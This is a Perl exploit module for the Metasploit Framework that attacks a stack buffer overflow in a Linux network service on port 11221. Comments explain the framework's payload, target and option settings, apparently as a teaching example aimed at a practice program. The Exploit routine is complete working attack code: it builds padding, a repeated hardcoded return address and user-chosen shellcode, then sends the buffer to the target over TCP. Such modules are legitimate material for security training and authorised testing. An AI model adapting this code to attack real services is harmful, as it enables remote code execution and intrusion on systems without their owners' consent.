
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::vuln1_2;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
# Calculated at 76, give some room for different paddings, etc
  'PreRetLength' => [76 - 8, 'Space before the we start writing return address.'],
  'RetLength'    => [32, 'Length of rets to write (in bytes)'],
};

my $info = {
  'Name'    => 'Vuln1 v2 Exploit',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'linux'],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 11221],
    },

  # We know added a Payload entry, telling the Framework that our exploit
  # requires a payload
  'Payload' =>
    {
      # We have a space limit because of the recv 4096, but its a big one
      # A bigger value would mean faster brute forcing (larger steps) but
      # also run the risk of running off the end of the stack
      'Space'     => 500,

      # No BadChars because the bug is a recv call
      'BadChars'  => "",

      # This means if we had a payload of 490 bytes in length it would
      # fail since there isn't room for 16 bytes of nop.
      'MinNops'   => 16, # This keeps brute forcing sane
    },
  'Description'  => Pex::Text::Freeform(qq{
      Killer shark, we never stop
    }),
  'Refs'  =>
    [
      'http://www.metasploit.com',
    ],

  # Setting this to -1 means that we won't pick a default target.
  # This is good if it is a 1 hit exploit, or if the target isn't
  # brute force, etc.
  'DefaultTarget' => -1,

  # Suppling a Targets entry tells the Framework we have targets.  The framework
  # will make a user supply a target (or default it, see above), and validate
  # that their target is valid, etc.
  'Targets' =>
    [

# Fudge the number gotten from gdb a bit to hit some nops and fall in
      ['Slackware Linux', 0xbffffa60],
    ],
};

# Again, boilerplate new function, same thing
sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  # We call GetVar to get UserOpts, etc
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');

  # The Framework returns the (validated) Target the user selected.
  # This is an index into our Targets Info entry
  my $targetIndex = $self->GetVar('TARGET');
  my $target = $self->Targets->[$targetIndex];
  my $ret = $target->[1];

  # The Framework puts an EncodedPayload entry into the environment.
  # This is a object which encapsulates the payload selected by the user
  my $encodedPayload = $self->GetVar('EncodedPayload');
  # Pull the payload data from the EncodedPayload object
  my $shellcode = $encodedPayload->Payload;

  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  # You call GetLocal for Advanced options, unlike calling GetVar above
  my $evil = 'A' x $self->GetLocal('PreRetLength');
  $evil .= pack('V', $ret) x int($self->GetLocal('RetLength') / 4);
  $evil .= $shellcode;

  $sock->Send($evil);

  return;
}

1;
